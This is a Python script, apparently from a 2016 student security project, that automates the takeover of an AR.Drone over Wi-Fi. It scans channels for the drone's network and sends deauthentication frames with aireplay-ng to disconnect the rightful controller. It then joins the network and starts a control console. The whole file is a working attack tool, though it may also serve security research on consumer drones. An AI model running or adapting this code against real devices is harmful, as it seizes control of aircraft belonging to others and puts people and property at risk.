"""" 
project csr 2016 - drone fuzzing
requirements: root privileges, scapy, aircrack-ng suite, node.js, node-ar-drone

"""

import subprocess
import signal
import threading
import re
from multiprocessing import Process
from scapy.all import *

def channel_hopper(interface):
    while True:
	try:
	    channel = random.randrange(1,13)
	    subprocess.call(["iwconfig", str(interface), "channel", str(channel)])
            time.sleep(1)
	except KeyboardInterrupt:
            break

def add_network(pckt, known_networks):
    essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[Dot11Elt].info != '' else 'Hidden SSID'
    bssid = pckt[Dot11].addr3
    channel = int(ord(pckt[Dot11Elt:3].info))
    if bssid not in known_networks:
	known_networks[bssid] = (essid, channel)
	#print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)

def find_drone_network(known_networks):
    global drone_bssid
    global drone_essid
    global drone_channel
    # regular expressions to find the drone's network
    regex = re.compile('\S*ardrone\S*')
    for bssid in known_networks:
        m = regex.match(known_networks[bssid][0])
        if m:
            drone_bssid = bssid
            drone_essid = m.group()
            drone_channel = known_networks[bssid][1]
            print("\033[92m")
            print("Match found: " + drone_essid)
            print("\033[0m")
            return
    # if no drone network has been found: stop
    print("\033[91m")
    print("\n\nNo Drone Network found! Please verify that the drone emits a signal!\n")
    print("\033[0m")
    subprocess.call(["airmon-ng", "stop", "mon0"])
    sys.exit()

def stop_channel_hop():
	global stop_sniff
	stop_sniff = True
	channel_hop.terminate()
	channel_hop.join()


if __name__ == "__main__":

    # set up interface mon0 in monitor mode from interface wlp3s0 (or wlan0)
    subprocess.call(["iwconfig", "wlp3s0", "essid", "off"]) # we only need our monitor interface
    subprocess.call(["airmon-ng", "check", "kill"]) # get rid of intervening processes
    subprocess.call(["airmon-ng", "start", "wlp3s0"]) # create monitoring interface
    subprocess.call(["ifconfig", "wlp3s0", "down"]) # we only need our monitor interface
    
    # show created wireless interface
    subprocess.call(["iwconfig", "mon0"])
 
    # configure interface
    conf.iface = "mon0"
    networks = {}
    stop_sniff = False

    # hop through channels and sniff out networks
    channel_hop = Process(target = channel_hopper, args=("mon0",))
    channel_hop.start()
    sniff( lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), prn=lambda x: add_network(x,networks),timeout=5)
    stop_channel_hop()
    time.sleep(1)
    
    # find the drone's network
    find_drone_network(networks)

    # create monitor interface for the right channel
    print("\033[92m")
    print("Creating mon1 for channel " + str(drone_channel))
    print("Drone BSSID is " + str(drone_bssid))
    print("\033[0m")    
    subprocess.call(["airmon-ng", "check", "kill"])
    subprocess.call(["airmon-ng", "start", "wlp3s0", str(drone_channel)])
    time.sleep(1)

    # perform deauthentication to get rid of all clients
    subprocess.call(["aireplay-ng", "-0", "5", "-a", str(drone_bssid), "mon1"])

    # get rid of the monitor interfaces
    subprocess.call(["airmon-ng", "stop", "mon0"])
    subprocess.call(["airmon-ng", "stop", "mon1"])
    
    # connect to drone interface in managed mode
    subprocess.call(["iwconfig", "wlp3s0", "essid", str(drone_essid), "channel", str(drone_channel), "ap", str(drone_bssid)])
    subprocess.call(["ifconfig", "wlp3s0", "up"]) # we now need this interface
    subprocess.call(["dhclient", "-v", "wlp3s0"]) # we need an ip address

    # start controlling the drone by using node-ar-drone
    print("\033[94m")
    print("Connection to drone established!")
    print("\033[0m")
    subprocess.call(["nodejs", "repl.js"])

    sys.exit()
